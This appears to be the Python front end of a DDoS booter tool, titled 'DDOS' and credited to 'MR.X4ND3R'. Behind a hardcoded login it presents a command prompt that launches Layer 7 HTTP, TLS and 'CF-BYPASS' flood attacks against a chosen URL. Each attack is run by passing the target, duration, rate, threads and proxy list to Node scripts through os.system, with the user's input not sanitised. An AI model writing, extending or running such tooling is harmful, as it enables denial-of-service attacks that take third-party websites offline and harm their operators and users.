import subprocess
import os
import time
import socket
import requests
import random
import getpass
import sys
import json
import platform
import colorama
from colors import string
                        
attemps = 0

while attemps < 150:
    username = input('Enter your username: ')
    password = input('Enter your password: ')

    if username == 'PCA' and password == 'PCA':
        print('You have successfully logged in.')
        break
    else:
        print('Incorrect credentials. Check if you have Caps lock on and try again.')
        attemps += 1
        continue

author = "Xander"


def prints(start_color, end_color, text):
    start_r, start_g, start_b = start_color
    end_r, end_g, end_b = end_color

    for i in range(len(text)):
        r = int(start_r + (end_r - start_r) * i / len(text))
        g = int(start_g + (end_g - start_g) * i / len(text))
        b = int(start_b + (end_b - start_b) * i / len(text))

        color_code = f"\033[38;2;{r};{g};{b}m"
        print(color_code + text[i], end="")
    
start_color = (255, 0, 0)
end_color = (0, 0, 255)

class Color:
	colorama.init(autoreset=True)
	LB = colorama.Fore.LIGHTBLUE_EX
	LC = colorama.Fore.LIGHTCYAN_EX
	LG = colorama.Fore.LIGHTGREEN_EX
	LR = colorama.Fore.LIGHTRED_EX
	LY = colorama.Fore.LIGHTYELLOW_EX
	RESET = colorama.Fore.RESET
	
def main():
    os.system('cls' if os.name == 'nt' else 'clear')
    banner = r"""
  (     (         )   (     
 )\ )  )\ )   ( /(   )\ )  
(()/( (()/(   )\()) (()/(  
 /(_)) /(_)) ((_)\   /(_)) 
(_))_ (_))_    ((_) (_))   
 |    \|   \  / _ \  / __|  
 | |) ||)  ||| (_) | \__ \  
 |___/ |___/  \___/  |___/  
 """
    author = r"""
		MR.X4ND3R
    """
    prints(start_color, end_color, banner)
    prints(end_color, start_color, author) 
    print("\n")
    print(Color.LR+"           ["+Color.LR+"Layer 7"+Color.LR+"]"+Color.LC+"HTTP-REQ") 
    print(Color.LR+"           ["+Color.LR+"Layer 7"+Color.LR+"]"+Color.LC+"TLS")
    print(Color.LR+"           ["+Color.LR+"Layer 7"+Color.LR+"]"+Color.LC+"CF-BYPASS")
    print("\n")
    print("\n")
    print("\n")
    print("\n")                            
                                                                 
    while True:
        cnc = input(Color.LB+"╔═══"+Color.LR+"["+Color.LG+"root"+Color.LB+"@"+Color.LG+"Xander"+Color.LR+"]"+Color.LB+"\n╚══> "+Color.RESET)
        if "HTTP-REQ" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node methods/HTTP-REQ/HTTP.js {url} {time}')
            except IndexError:
                print('Usage: HTTP-REQ <url> <time>')
                print('Example: HTTP-REQ http://example.com 60')
        
        elif "TLS" in cnc:
            try:
                target = cnc.split()[1]
                time = cnc.split()[2]
                Rate = cnc.split()[3]
                threads = cnc.split()[4]
                proxyfile = cnc.split()[5]
                os.system(f'node methods/TLS/TLSv1.js {target} {time} {Rate} {threads} {proxyfile}')
            except IndexError:
                print('Usage: TLS <TARGET> <TIME> <RATE> <THREADS> <PROXYFILE>')
                print('Example: TLS http://example.com 100 64 5 http.txt')
                
        elif "CF-BYPASS" in cnc:
            try:
                method = cnc.split()[1]
                url = cnc.split()[2]
                proxies = cnc.split()[3]
                time = cnc.split()[4]
                rate = cnc.split()[5]
                threads = cnc.split()[6]
                os.system(f'node methods/CFBYPASS/HTTPS-POWER.js {method} {url} {proxies} {time} {rate} {threads}')
            except IndexError:
                print('Usage: CF-BYPASS [METHODS] [URL] [PROXIES] [TIME] [RATE] [THREADS]')
                print('Example: CF-BYPASS  GET https://example.com http.txt 60 64 5')
                                                
        else:
            try:
                cmmnd = cnc.split()[0]
                print("Method: [ " + cmmnd + " ] Error Command")
            except IndexError:
                pass
                
if author == "Xander":
    main()
else:
    string.authorXander()
